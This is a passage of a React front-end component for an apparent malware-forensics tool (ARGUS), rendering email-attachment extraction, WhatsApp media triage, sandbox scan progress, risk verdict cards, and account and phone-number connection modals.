                  .catch((err) => setError(err.message));
              }
            }}
            onClick={() => emailInputRef.current?.click()}
            className={`p-8 rounded-3xl border-2 border-dashed text-center transition-all cursor-pointer bg-white shadow-xs ${
              dragActive
                ? 'border-indigo-500 bg-indigo-50/60 scale-[1.01]'
                : emailResult
                ? 'border-indigo-300 bg-indigo-50/20'
                : 'border-slate-300 hover:border-indigo-400 hover:bg-indigo-50/20'
            }`}
          >
            <input
              ref={emailInputRef}
              type="file"
              accept=".eml,.msg,message/rfc822,*/*"
              onChange={(e) => {
                if (e.target.files && e.target.files[0]) {
                  handleExtractEmailFile(e.target.files[0]);
                }
              }}
              className="hidden"
            />

            <div className="w-12 h-12 rounded-2xl border border-indigo-100 bg-indigo-50 flex items-center justify-center mx-auto mb-2 text-indigo-600 shadow-xs">
              <Upload className="w-6 h-6 text-indigo-600" />
            </div>

            <div className="text-sm font-bold text-slate-900">
              Drag & Drop Email (.eml, .msg) or Direct Attachment Here
            </div>
            <p className="text-xs text-slate-500 mt-1 max-w-xl mx-auto">
              Attachments are parsed directly in an isolated memory buffer without saving to your host drive.
            </p>
          </div>

          {/* Direct Link Ingestion */}
          <div className="p-4 rounded-2xl bg-white border border-slate-200 flex flex-col sm:flex-row items-center gap-3 text-xs shadow-xs">
            <div className="flex items-center gap-2 text-slate-600 shrink-0 font-semibold">
              <LinkIcon className="w-4 h-4 text-indigo-600" />
              <span>Email Attachment Link:</span>
            </div>
            <input
              type="text"
              value={attachmentLinkUrl}
              onChange={(e) => setAttachmentLinkUrl(e.target.value)}
              placeholder="Paste direct attachment URL from Gmail / Outlook / Drive..."
              className="w-full px-3 py-2 rounded-xl border border-slate-200 bg-slate-50/60 text-xs text-slate-800 focus:outline-none focus:border-indigo-500"
            />
            <button
              onClick={handleFetchFromUrl}
              disabled={!attachmentLinkUrl.trim() || extractingEmail}
              className="px-4 py-2 rounded-xl bg-indigo-600 hover:bg-indigo-700 text-white font-semibold shrink-0 cursor-pointer disabled:opacity-50 transition-all active:scale-95"
            >
              Scan Link
            </button>
          </div>

          {/* Email Extraction Loading */}
          {extractingEmail && (
            <div className="p-6 rounded-3xl border border-indigo-200 bg-indigo-50/50 flex items-center justify-center gap-3 text-indigo-800 text-sm font-semibold shadow-xs">
              <RefreshCw className="w-5 h-5 animate-spin text-indigo-600" />
              <span>Extracting file attachments in secure memory buffer (Zero local downloads)...</span>
            </div>
          )}

          {/* Extracted Attachments View */}
          {emailResult && !extractingEmail && (
            <div className="p-6 rounded-3xl border border-slate-200 bg-white space-y-6 shadow-xs">
              {/* Email Meta Card */}
              <div className="flex flex-col md:flex-row md:items-start justify-between gap-4 pb-4 border-b border-slate-100">
                <div className="space-y-1">
                  <div className="flex items-center gap-2">
                    <span className="text-[10px] uppercase font-bold font-mono px-2 py-0.5 rounded-md bg-indigo-50 text-indigo-700 border border-indigo-200">
                      Email Ingested
                    </span>
                    <span className="text-xs text-slate-400 font-mono">{emailResult.original_name}</span>
                  </div>
                  <h3 className="text-lg font-bold text-slate-900">{emailResult.subject}</h3>
                  <div className="text-xs text-slate-600 space-y-0.5 pt-1">
                    <div>
                      <span className="font-semibold text-slate-400">From: </span>
                      <span className="font-mono text-slate-800 font-medium">{emailResult.sender}</span>
                    </div>
                    <div>
                      <span className="font-semibold text-slate-400">To: </span>
                      <span className="font-mono text-slate-700">{emailResult.recipient}</span>
                    </div>
                  </div>
                </div>

                <div className="flex flex-wrap md:flex-col items-end gap-2 shrink-0">
                  <div className="flex items-center gap-2">
                    <span className="text-[11px] font-semibold text-slate-500">SPF:</span>
                    <span
                      className={`text-[10px] font-bold px-2 py-0.5 rounded-full border ${
                        emailResult.spf_status === 'PASS'
                          ? 'bg-emerald-50 text-emerald-700 border-emerald-200'
                          : emailResult.spf_status === 'FAIL'
                          ? 'bg-rose-50 text-rose-700 border-rose-200 font-mono'
                          : 'bg-slate-100 text-slate-600 border-slate-200'
                      }`}
                    >
                      {emailResult.spf_status}
                    </span>
                    <span className="text-[11px] font-semibold text-slate-500 ml-2">DKIM:</span>
                    <span
                      className={`text-[10px] font-bold px-2 py-0.5 rounded-full border ${
                        emailResult.dkim_status === 'PASS'
                          ? 'bg-emerald-50 text-emerald-700 border-emerald-200'
                          : emailResult.dkim_status === 'FAIL'
                          ? 'bg-rose-50 text-rose-700 border-rose-200 font-mono'
                          : 'bg-slate-100 text-slate-600 border-slate-200'
                      }`}
                    >
                      {emailResult.dkim_status}
                    </span>
                  </div>

                  <button
                    onClick={() => setEmailResult(null)}
                    className="text-xs text-slate-400 hover:text-slate-600 underline pt-1 cursor-pointer"
                  >
                    Clear Email
                  </button>
                </div>
              </div>

              {/* Extracted File Attachments */}
              <div className="space-y-3">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <h4 className="text-sm font-bold text-slate-900">Extracted File Attachments ({emailResult.attachments.length})</h4>
                    <span className="text-xs px-2.5 py-0.5 rounded-full bg-emerald-50 text-emerald-700 font-semibold border border-emerald-200">
                      Isolated in Memory
                    </span>
                  </div>
                  <span className="text-[11px] text-slate-400 font-medium">
                    Direct automated sandbox inspection
                  </span>
                </div>

                {emailResult.attachments.length === 0 ? (
                  <div className="p-8 text-center text-xs text-slate-500 bg-slate-50 rounded-2xl border border-slate-100">
                    No attachments detected in this email.
                  </div>
                ) : (
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    {emailResult.attachments.map((att) => {
                      const isAnalyzingThis = analyzing && analyzingAttachmentId === att.id;
                      return (
                        <div
                          key={att.id}
                          className={`p-4 rounded-2xl border transition-all bg-white flex flex-col justify-between ${
                            att.is_suspicious
                              ? 'border-rose-200 shadow-xs hover:border-rose-300'
                              : 'border-slate-200 shadow-xs hover:border-slate-300'
                          }`}
                        >
                          <div>
                            <div className="flex items-start justify-between gap-2 pb-2">
                              <div className="flex items-center gap-2.5">
                                <div className={`p-2 rounded-xl ${att.is_suspicious ? 'bg-rose-50 text-rose-600' : 'bg-indigo-50 text-indigo-600'}`}>
                                  <FileCode className="w-5 h-5" />
                                </div>
                                <div>
                                  <div className="text-xs font-bold text-slate-900 break-all">{att.filename}</div>
                                  <div className="text-[11px] text-slate-400 font-mono">
                                    {(att.size_bytes / 1024).toFixed(1)} KB • {att.content_type}
                                  </div>
                                </div>
                              </div>

                              {att.is_suspicious && (
                                <span className="text-[10px] font-bold px-2 py-0.5 rounded-md bg-rose-50 text-rose-700 border border-rose-200 shrink-0">
                                  High Risk File
                                </span>
                              )}
                            </div>

                            <div className="mt-2 p-2 rounded-xl bg-slate-50 border border-slate-100 text-[10px] font-mono text-slate-500">
                              <span className="text-slate-400 font-semibold">SHA-256: </span>
                              <span className="text-slate-800">{att.sha256.substring(0, 24)}...</span>
                            </div>
                          </div>

                          <div className="mt-4 pt-3 border-t border-slate-100 flex items-center justify-between gap-2">
                            <span className="text-[10px] text-emerald-700 font-semibold flex items-center gap-1">
                              <CheckCircle2 className="w-3.5 h-3.5" />
                              <span>Ready for Sandbox</span>
                            </span>

                            <button
                              disabled={analyzing}
                              onClick={() => handleAnalyzeExtractedAttachment(att)}
                              className={`flex items-center gap-1.5 px-4 py-2 rounded-xl text-xs font-semibold transition-all cursor-pointer ${
                                isAnalyzingThis
                                  ? 'bg-indigo-100 text-indigo-700'
                                  : 'bg-indigo-600 hover:bg-indigo-700 text-white shadow-xs active:scale-95'
                              }`}
                            >
                              {isAnalyzingThis ? (
                                <>
                                  <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                                  <span>Scanning...</span>
                                </>
                              ) : (
                                <>
                                  <ShieldAlert className="w-3.5 h-3.5 text-white" />
                                  <span>Scan in Sandbox</span>
                                </>
                              )}
                            </button>
                          </div>
                        </div>
                      );
                    })}
                  </div>
                )}
              </div>
            </div>
          )}
        </div>
      )}

      {/* MODE 3: WhatsApp Media Triage */}
      {activeMode === 'whatsapp' && (
        <div className="space-y-6">
          <div className="p-6 rounded-3xl border border-slate-200 bg-white shadow-xs">
            <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-5 border-b border-slate-100">
              <div className="flex items-center gap-3.5">
                <div className="w-12 h-12 rounded-2xl bg-gradient-to-tr from-emerald-500 to-teal-600 flex items-center justify-center text-white shadow-md shadow-emerald-500/20">
                  <MessageSquare className="w-6 h-6 text-white" />
                </div>
                <div>
                  <div className="flex items-center gap-2">
                    <h3 className="text-base font-bold text-slate-900">WhatsApp Web & Media Stream</h3>
                    <span className="flex items-center gap-1 text-[11px] font-semibold text-emerald-700 bg-emerald-50 px-2 py-0.5 rounded-full border border-emerald-200">
                      <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse"></span>
                      {waConnected ? 'Session Connected' : 'Awaiting Pairing'}
                    </span>
                  </div>
                  <div className="flex items-center gap-2 text-xs text-slate-500 mt-1">
                    <span>Linked Number:</span>
                    <span className="font-mono font-bold text-emerald-700 bg-emerald-50 px-2 py-0.5 rounded-md border border-emerald-200">
                      {userWaNumber} ({userWaDisplayName})
                    </span>
                    <button
                      onClick={() => setShowWaConnectModal(true)}
                      className="text-xs font-semibold text-emerald-600 hover:text-emerald-800 underline cursor-pointer ml-1"
                    >
                      Change / Enter Number
                    </button>
                  </div>
                </div>
              </div>

              <div className="flex items-center gap-2 shrink-0">
                <a
                  href="https://web.whatsapp.com"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="px-3.5 py-2 rounded-xl bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-700 hover:to-teal-700 text-white text-xs font-bold cursor-pointer transition-all flex items-center gap-1.5 shadow-md shadow-emerald-500/20 active:scale-95"
                >
                  <ExternalLink className="w-3.5 h-3.5" />
                  <span>Open web.whatsapp.com</span>
                </a>
                <button
                  onClick={() => setShowWaConnectModal(true)}
                  className="px-3.5 py-2 rounded-xl border border-emerald-200 bg-emerald-50/70 hover:bg-emerald-100/70 text-emerald-800 text-xs font-semibold cursor-pointer transition-colors flex items-center gap-1.5 shadow-xs"
                >
                  <Smartphone className="w-3.5 h-3.5 text-emerald-600" />
                  <span>Insert Phone Number</span>
                </button>
                <button
                  onClick={() => loadWhatsAppChats()}
                  disabled={waLoading}
                  className="px-3.5 py-2 rounded-xl border border-slate-200 hover:bg-slate-50 text-slate-700 text-xs font-semibold cursor-pointer transition-colors flex items-center gap-1.5 shadow-xs"
                >
                  <RefreshCw className={`w-3.5 h-3.5 ${waLoading ? 'animate-spin text-emerald-600' : 'text-slate-500'}`} />
                  <span>Sync WhatsApp</span>
                </button>
              </div>
            </div>

            {/* Chrome / Edge Extension Deployment Banner for WhatsApp Web */}
            <div className="mt-4 p-4 rounded-2xl bg-gradient-to-r from-slate-900 via-emerald-950 to-slate-900 text-white border border-emerald-800/50 shadow-sm flex flex-col md:flex-row items-center justify-between gap-4">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-xl bg-emerald-500/20 border border-emerald-400/30 flex items-center justify-center text-emerald-400 font-bold">
                  🧩
                </div>
                <div>
                  <div className="text-xs font-bold flex items-center gap-2">
                    <span>WhatsApp Web Chrome / Edge Extension</span>
                    <span className="text-[10px] px-2 py-0.5 rounded-full bg-emerald-500/30 text-emerald-300 font-mono">
                      LOAD UNPACKED READY
                    </span>
                  </div>
                  <div className="text-[11px] text-slate-300 mt-0.5">
                    Injects floating drag-and-drop pop up directly into official <code className="text-emerald-300 font-mono">web.whatsapp.com</code>.
                  </div>
                </div>
              </div>

              <div className="flex items-center gap-2 shrink-0">
                <button
                  onClick={() => {
                    alert('To load in Chrome/Edge:\n1. Open chrome://extensions/\n2. Enable Developer Mode (top-right)\n3. Click "Load unpacked"\n4. Select folder: malicious-file-forensics/extension\n5. Open web.whatsapp.com — ARGUS Interceptor pop-up appears automatically!');
                  }}
                  className="px-3.5 py-2 rounded-xl bg-white text-slate-900 text-xs font-bold hover:bg-slate-100 cursor-pointer transition-all shadow-xs"
                >
                  View 1-Step Setup
                </button>
                <a
                  href="https://web.whatsapp.com"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="px-3.5 py-2 rounded-xl bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-bold transition-all shadow-xs flex items-center gap-1.5"
                >
                  <ExternalLink className="w-3.5 h-3.5" />
                  <span>Launch WhatsApp Web</span>
                </a>
              </div>
            </div>

            {/* WhatsApp Chat List and Media Ingestion */}
            <div className="pt-5">
              {waLoading && waChats.length === 0 ? (
                <div className="py-12 flex flex-col items-center justify-center text-slate-500 text-xs">
                  <RefreshCw className="w-6 h-6 animate-spin text-emerald-600 mb-2" />
                  <span>Syncing WhatsApp encrypted session and chat media...</span>
                </div>
              ) : (
                <div className="grid grid-cols-1 lg:grid-cols-12 gap-4">
                  {/* Left: Chat Contacts */}
                  <div className="lg:col-span-5 space-y-2 max-h-[420px] overflow-y-auto pr-1">
                    {waChats.map((chat) => {
                      const isSelected = selectedWaChat?.chat_id === chat.chat_id;
                      const hasSnap = chat.messages?.some((m: any) => m.attachment?.content_type?.startsWith('image/'));
                      return (
                        <div
                          key={chat.chat_id}
                          onClick={() => setSelectedWaChat(chat)}
                          className={`p-3.5 rounded-2xl border text-left cursor-pointer transition-all ${
                            isSelected
                              ? 'border-emerald-500 bg-emerald-50/40 shadow-xs'
                              : 'border-slate-200 hover:border-slate-300 hover:bg-slate-50/70 bg-white'
                          }`}
                        >
                          <div className="flex items-center justify-between gap-2">
                            <div className="flex items-center gap-2 min-w-0">
                              <div className="w-8 h-8 rounded-full bg-emerald-600 text-white flex items-center justify-center font-bold text-xs shrink-0">
                                {chat.avatar}
                              </div>
                              <span className="text-xs font-bold text-slate-900 truncate">{chat.sender_name}</span>
                            </div>
                            <span className="text-[10px] text-slate-400 font-mono shrink-0">{chat.last_message_time}</span>
                          </div>
                          <div className="text-[11px] text-slate-500 truncate mt-1.5 ml-10">
                            {chat.messages[0]?.text}
                          </div>
                          <div className="flex items-center gap-2 mt-2 pt-2 border-t border-slate-100 ml-10">
                            <span className="flex items-center gap-1 text-[10px] font-semibold text-emerald-700 bg-emerald-50 px-2 py-0.5 rounded-md border border-emerald-200">
                              {hasSnap ? <Camera className="w-3 h-3 text-emerald-600" /> : <Paperclip className="w-3 h-3 text-emerald-600" />}
                              <span>{chat.messages[0]?.attachment?.filename}</span>
                            </span>
                            {hasSnap && (
                              <span className="text-[9px] px-1.5 py-0.5 rounded bg-teal-50 text-teal-700 font-bold border border-teal-200">
                                Snap / Image
                              </span>
                            )}
                          </div>
                        </div>
                      );
                    })}
                  </div>

                  {/* Right: Selected Chat Thread & Direct Media Scanner */}
                  <div className="lg:col-span-7 p-4 rounded-2xl border border-slate-200 bg-slate-50/60 flex flex-col justify-between">
                    {selectedWaChat ? (
                      <div className="space-y-4">
                        <div className="border-b border-slate-200 pb-3 flex items-center justify-between">
                          <div>
                            <h4 className="text-sm font-bold text-slate-900">{selectedWaChat.sender_name}</h4>
                            <div className="text-xs text-slate-500 font-mono mt-0.5">{selectedWaChat.phone_number}</div>
                          </div>
                          <span className="text-[10px] font-bold px-2.5 py-1 rounded-full bg-emerald-100 text-emerald-800 border border-emerald-200 flex items-center gap-1">
                            <Smartphone className="w-3 h-3" />
                            WhatsApp Active
                          </span>
                        </div>

                        {/* Messages in this chat */}
                        <div className="space-y-3 max-h-[340px] overflow-y-auto pr-1">
                          {selectedWaChat.messages.map((m: any) => {
                            const att = m.attachment;
                            const isAnalyzingThis = analyzing && analyzingWaId === att?.id;
                            const isImageSnap = att?.content_type?.startsWith('image/');

                            return (
                              <div key={m.message_id} className="space-y-2">
                                <div className="p-3 bg-white rounded-2xl border border-slate-200 shadow-xs max-w-md">
                                  <p className="text-xs text-slate-800 leading-relaxed">{m.text}</p>
                                  <div className="text-[10px] text-slate-400 text-right mt-1 font-mono">{m.timestamp}</div>
                                </div>

                                {att && (
                                  <div className="p-4 bg-white rounded-2xl border border-slate-200 shadow-xs space-y-3">
                                    <div className="flex items-start justify-between gap-3">
                                      <div className="flex items-center gap-3 min-w-0">
                                        <div className={`p-2.5 rounded-xl ${
                                          att.is_suspicious 
                                            ? 'bg-rose-50 text-rose-600' 
                                            : isImageSnap
                                            ? 'bg-teal-50 text-teal-600'
                                            : 'bg-emerald-50 text-emerald-600'
                                        }`}>
                                          {isImageSnap ? <Camera className="w-5 h-5" /> : <FileCode className="w-5 h-5" />}
                                        </div>
                                        <div className="min-w-0">
                                          <div className="text-xs font-bold text-slate-900 truncate">{att.filename}</div>
                                          <div className="text-[10px] text-slate-400 font-mono mt-0.5">
                                            {(att.size_bytes / 1024).toFixed(1)} KB • {att.content_type}
                                          </div>
                                        </div>
                                      </div>

                                      {att.is_suspicious ? (
                                        <span className="text-[10px] font-bold px-2 py-0.5 rounded bg-rose-50 text-rose-700 border border-rose-200 shrink-0">
                                          High Risk
                                        </span>
                                      ) : isImageSnap ? (
                                        <span className="text-[10px] font-bold px-2 py-0.5 rounded bg-teal-50 text-teal-700 border border-teal-200 shrink-0">
                                          Snap Media
                                        </span>
                                      ) : (
                                        <span className="text-[10px] font-bold px-2 py-0.5 rounded bg-emerald-50 text-emerald-700 border border-emerald-200 shrink-0">
                                          Document
                                        </span>
                                      )}
                                    </div>

                                    {/* Snap Preview if image */}
                                    {isImageSnap && att.data_base64 && (
                                      <div className="p-2 rounded-xl bg-slate-50 border border-slate-100 flex items-center gap-3">
                                        <img
                                          src={`data:${att.content_type};base64,${att.data_base64}`}
                                          alt="Snap Attachment"
                                          className="w-12 h-12 object-cover rounded-lg border border-slate-200 shadow-xs"
                                        />
                                        <div className="text-[11px] text-slate-600">
                                          <div className="font-bold">Direct Camera Snap / Image</div>
                                          <div className="text-slate-400 text-[10px]">Inspectable in memory buffer sandbox</div>
                                        </div>
                                      </div>
                                    )}

                                    <div className="flex items-center justify-between pt-2 border-t border-slate-100">
                                      <span className="text-[10px] text-emerald-700 font-semibold flex items-center gap-1">
                                        <CheckCircle2 className="w-3.5 h-3.5" />
                                        <span>Direct Ingestion Ready</span>
                                      </span>

                                      <button
                                        disabled={analyzing}
                                        onClick={() => handleScanWhatsAppMedia(m, att)}
                                        className="px-4 py-2 rounded-xl bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-bold cursor-pointer transition-all flex items-center gap-1.5 shadow-xs disabled:opacity-50 active:scale-95"
                                      >
                                        {isAnalyzingThis ? (
                                          <>
                                            <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                                            <span>Scanning...</span>
                                          </>
                                        ) : (
                                          <>
                                            <ShieldAlert className="w-3.5 h-3.5" />
                                            <span>Scan in Sandbox</span>
                                          </>
                                        )}
                                      </button>
                                    </div>
                                  </div>
                                )}
                              </div>
                            );
                          })}
                        </div>
                      </div>
                    ) : (
                      <div className="py-16 text-center text-xs text-slate-400">
                        Select a chat contact from WhatsApp to inspect incoming media
                      </div>
                    )}
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* Error Banner */}
      {error && (
        <div className="p-4 rounded-2xl bg-rose-50 border border-rose-200 text-rose-800 text-xs flex items-center gap-3">
          <AlertCircle className="w-5 h-5 shrink-0 text-rose-600" />
          <span>{error}</span>
        </div>
      )}

      {/* Analysis Progress */}
      {analyzing && (
        <div className="p-6 rounded-3xl border border-slate-200 bg-white space-y-4 shadow-xs">
          <div className="flex items-center justify-between text-xs">
            <span className="font-bold text-slate-900 flex items-center gap-2">
              <RefreshCw className="w-4 h-4 text-indigo-600 animate-spin" />
              <span>Analyzing Target: {analyzingTargetName || selectedFile?.name}</span>
            </span>
            <span className="text-indigo-600 font-mono text-[11px] font-bold">
              Stage {Math.min(currentStage + 1, stages.length)} / {stages.length}
            </span>
          </div>

          {/* Progress Bar */}
          <div className="w-full bg-slate-100 rounded-full h-2 overflow-hidden border border-slate-200">
            <div
              className="bg-indigo-600 h-2 rounded-full transition-all duration-300"
              style={{ width: `${((currentStage + 1) / stages.length) * 100}%` }}
            ></div>
          </div>

          {/* Stages List */}
          <div className="grid grid-cols-1 gap-1.5 pt-1 text-xs">
            {stages.map((st, i) => {
              const isPast = i < currentStage;
              const isCurr = i === currentStage;
              return (
                <div
                  key={i}
                  className={`flex items-center gap-2.5 px-3 py-2 rounded-xl text-[11px] transition-colors ${
                    isCurr
                      ? 'bg-indigo-50 text-indigo-900 font-bold border border-indigo-200'
                      : isPast
                      ? 'text-slate-600'
                      : 'text-slate-400'
                  }`}
                >
                  {isPast ? (
                    <CheckCircle2 className="w-4 h-4 text-emerald-600 shrink-0" />
                  ) : isCurr ? (
                    <RefreshCw className="w-4 h-4 text-indigo-600 animate-spin shrink-0" />
                  ) : (
                    <div className="w-3.5 h-3.5 rounded-full border border-slate-300 shrink-0"></div>
                  )}
                  <span>{st}</span>
                </div>
              );
            })}
          </div>
        </div>
      )}

      {/* Analysis Result Card */}
      {result && (
        <div className="p-6 rounded-3xl border border-slate-200 bg-white space-y-5 shadow-xs">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-4 border-b border-slate-100">
            <div>
              <div className="text-[10px] text-slate-400 uppercase tracking-wider font-mono">Triage Complete</div>
              <h2 className="text-base font-bold text-slate-900">{result.original_name}</h2>
              <div className="flex items-center gap-1.5 text-[11px] text-slate-500 font-mono mt-0.5">
                <span>SHA-256: {result.sha256}</span>
                <button
                  type="button"
                  onClick={() => {
                    navigator.clipboard.writeText(result.sha256);
                    setCopiedHash(true);
                    setTimeout(() => setCopiedHash(false), 2000);
                  }}
                  className="p-1 rounded-lg hover:bg-slate-100 text-slate-400 hover:text-slate-700 cursor-pointer transition-colors"
                  title="Copy SHA-256 hash"
                >
                  {copiedHash ? <Check className="w-3.5 h-3.5 text-emerald-600" /> : <Copy className="w-3.5 h-3.5" />}
                </button>
              </div>
            </div>

            <div className="flex items-center gap-2 self-start sm:self-auto">
              <span
                className={`text-xs font-bold font-mono px-3.5 py-1.5 rounded-xl border ${
                  result.risk_level === 'CRITICAL'
                    ? 'bg-rose-50 text-rose-700 border-rose-200'
                    : result.risk_level === 'HIGH'
                    ? 'bg-amber-50 text-amber-700 border-amber-200'
                    : result.risk_level === 'MEDIUM'
                    ? 'bg-yellow-50 text-yellow-800 border-yellow-200'
                    : 'bg-emerald-50 text-emerald-700 border-emerald-200'
                }`}
              >
                {result.risk_level} RISK
              </span>
              <div className="text-right">
                <div className="text-lg font-black text-slate-900 font-mono">
                  {result.risk_score.toFixed(1)}
                  <span className="text-xs text-slate-400 font-normal">/100</span>
                </div>
              </div>
            </div>
          </div>

          {/* Quick Actions */}
          <div className="flex flex-wrap items-center gap-2.5 pt-1">
            <button
              onClick={() => onNavigateToGraph(result.id)}
              className="flex items-center gap-2 px-4 py-2 rounded-xl bg-slate-900 hover:bg-slate-800 text-white text-xs font-semibold transition-all cursor-pointer shadow-xs active:scale-95"
            >
              <Network className="w-4 h-4 text-indigo-400" />
              <span>Explore Reconstructed Attack Graph</span>
              <ArrowRight className="w-3.5 h-3.5 text-slate-400" />
            </button>

            {onNavigateToDefense && (
              <button
                onClick={() => onNavigateToDefense(result.id)}
                className="flex items-center gap-2 px-4 py-2 rounded-xl bg-indigo-50 hover:bg-indigo-100 text-indigo-700 border border-indigo-200 text-xs font-semibold transition-all cursor-pointer active:scale-95"
              >
                <Shield className="w-4 h-4 text-indigo-600" />
                <span>Simulate Defensive Countermeasures</span>
              </button>
            )}

            <button
              onClick={() => onNavigateToDetails(result.id)}
              className="flex items-center gap-2 px-4 py-2 rounded-xl border border-slate-200 hover:bg-slate-50 text-slate-700 text-xs font-semibold transition-all cursor-pointer"
            >
              <FileCode className="w-4 h-4 text-slate-500" />
              <span>Full Forensic Dossier</span>
            </button>

            <button
              onClick={() => setShowPopup(true)}
              className="flex items-center gap-1.5 px-3 py-2 rounded-xl bg-indigo-50/50 hover:bg-indigo-50 text-indigo-600 text-xs font-semibold transition-all cursor-pointer border border-indigo-100 ml-auto"
            >
              <Sparkles className="w-3.5 h-3.5 text-indigo-600" />
              <span>Re-open Verdict Popup Card</span>
            </button>
          </div>

          {/* Collapsible Technical Telemetry Breakdown */}
          <div className="pt-2 border-t border-slate-100">
            <button
              onClick={() => setShowTechnicalDetails(!showTechnicalDetails)}
              className="w-full flex items-center justify-between text-xs font-bold text-slate-600 hover:text-slate-900 cursor-pointer py-1"
            >
              <span>Detailed Extracted Evidence Records ({evidence.length} Indicators)</span>
              {showTechnicalDetails ? (
                <ChevronUp className="w-4 h-4 text-slate-400" />
              ) : (
                <ChevronDown className="w-4 h-4 text-slate-400" />
              )}
            </button>

            {showTechnicalDetails && (
              <div className="mt-3 space-y-2">
                {evidence.map((ev) => (
                  <div
                    key={ev.id}
                    className="p-3 rounded-xl border border-slate-100 bg-slate-50 flex items-start justify-between gap-3 text-xs"
                  >
                    <div>
                      <div className="font-bold text-slate-800">{ev.title}</div>
                      <div className="text-slate-500 text-[11px] mt-0.5">{ev.description}</div>
                      <div className="text-[10px] font-mono text-slate-400 mt-1">
                        Source: {ev.extraction_source} • Category: {ev.category}
                      </div>
                    </div>
                    <span
                      className={`text-[10px] font-bold px-2 py-0.5 rounded-md border shrink-0 ${
                        ev.severity === 'CRITICAL'
                          ? 'bg-rose-50 text-rose-700 border-rose-200'
                          : ev.severity === 'HIGH'
                          ? 'bg-amber-50 text-amber-700 border-amber-200'
                          : ev.severity === 'MEDIUM'
                          ? 'bg-yellow-50 text-yellow-800 border-yellow-200'
                          : 'bg-slate-100 text-slate-600 border-slate-200'
                      }`}
                    >
                      {ev.severity}
                    </span>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      )}

      {/* Interactive Scan Verdict Modal */}
      {result && (
        <ScanVerdictModal
          isOpen={showPopup}
          onClose={() => setShowPopup(false)}
          verdict={result}
          evidence={evidence}
          onNavigateToDetails={() => onNavigateToDetails(result.id)}
          onNavigateToDefense={() => onNavigateToDefense?.(result.id)}
        />
      )}

      {/* SRM University Account Selector Modal */}
      {showAccountSelectorModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-900/40 backdrop-blur-xs animate-in fade-in duration-150">
          <div className="w-full max-w-md bg-white rounded-3xl border border-slate-200 shadow-2xl p-6 space-y-5">
            <div className="flex items-start justify-between pb-3 border-b border-slate-100">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-2xl bg-gradient-to-tr from-red-500 to-rose-600 flex items-center justify-center text-white shadow-sm">
                  <Mail className="w-5 h-5 text-white" />
                </div>
                <div>
                  <h3 className="text-base font-bold text-slate-900">Select SRM Student Account</h3>
                  <p className="text-xs text-slate-500">Connect Gmail inbox directly to ARGUS Sandbox</p>
                </div>
              </div>
              <button
                onClick={() => setShowAccountSelectorModal(false)}
                className="text-slate-400 hover:text-slate-600 p-1 rounded-lg hover:bg-slate-100 text-lg leading-none cursor-pointer"
              >
                ×
              </button>
            </div>

            <p className="text-xs text-slate-600 leading-relaxed">
              Choose your university institutional email to inspect incoming emails and scan attached files directly in isolated memory without local downloads:
            </p>

            <div className="space-y-3">
              {SRM_ACCOUNTS.map((acc) => {
                const isSelected = selectedStudentEmail === acc.email;
                return (
                  <div
                    key={acc.email}
                    onClick={() => switchAccountAndConnect(acc.email)}
                    className={`p-4 rounded-2xl border transition-all cursor-pointer flex items-center justify-between gap-3 ${
                      isSelected
                        ? 'border-indigo-500 bg-indigo-50/50 shadow-xs'
                        : 'border-slate-200 hover:border-slate-300 hover:bg-slate-50 bg-white'
                    }`}
                  >
                    <div className="flex items-center gap-3 min-w-0">
                      <div className={`w-10 h-10 rounded-xl ${acc.color} text-white flex items-center justify-center font-bold text-xs shrink-0 shadow-xs`}>
                        {acc.avatar}
                      </div>
                      <div className="min-w-0">
                        <div className="text-xs font-bold text-slate-900 flex items-center gap-1.5">
                          <span>{acc.name}</span>
                          {isSelected && (
                            <span className="text-[10px] px-1.5 py-0.2 rounded-md bg-indigo-100 text-indigo-700 font-semibold">Active</span>
                          )}
                        </div>
                        <div className="text-xs text-indigo-600 font-mono font-medium truncate mt-0.5">
                          {acc.email}
                        </div>
                        <div className="text-[10px] text-slate-400 mt-0.5">
                          {acc.role}
                        </div>
                      </div>
                    </div>

                    <div className="shrink-0">
                      <button
                        onClick={(e) => {
                          e.stopPropagation();
                          switchAccountAndConnect(acc.email);
                        }}
                        className={`px-3 py-1.5 rounded-xl text-xs font-semibold cursor-pointer transition-colors ${
                          isSelected
                            ? 'bg-indigo-600 text-white'
                            : 'bg-slate-100 hover:bg-indigo-50 hover:text-indigo-600 text-slate-700'
                        }`}
                      >
                        {isSelected ? 'Connected' : 'Select'}
                      </button>
                    </div>
                  </div>
                );
              })}
            </div>

            <div className="pt-2 text-center">
              <button
                onClick={() => setShowAccountSelectorModal(false)}
                className="text-xs text-slate-400 hover:text-slate-600 font-medium cursor-pointer"
              >
                Close and proceed with current selection
              </button>
            </div>
          </div>
        </div>
      )}

      {/* WhatsApp Number Ingestion & Pairing Modal */}
      {showWaConnectModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-900/40 backdrop-blur-xs animate-in fade-in duration-150">
          <div className="w-full max-w-md bg-white rounded-3xl border border-slate-200 shadow-2xl p-6 space-y-5">
            <div className="flex items-start justify-between pb-3 border-b border-slate-100">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-2xl bg-gradient-to-tr from-emerald-500 to-teal-600 flex items-center justify-center text-white shadow-sm">
                  <Smartphone className="w-5 h-5 text-white" />
                </div>
                <div>
                  <h3 className="text-base font-bold text-slate-900">Connect WhatsApp Account</h3>
                  <p className="text-xs text-slate-500">Enter your mobile number to load live chats & snap files</p>
                </div>
              </div>
              <button
                onClick={() => setShowWaConnectModal(false)}
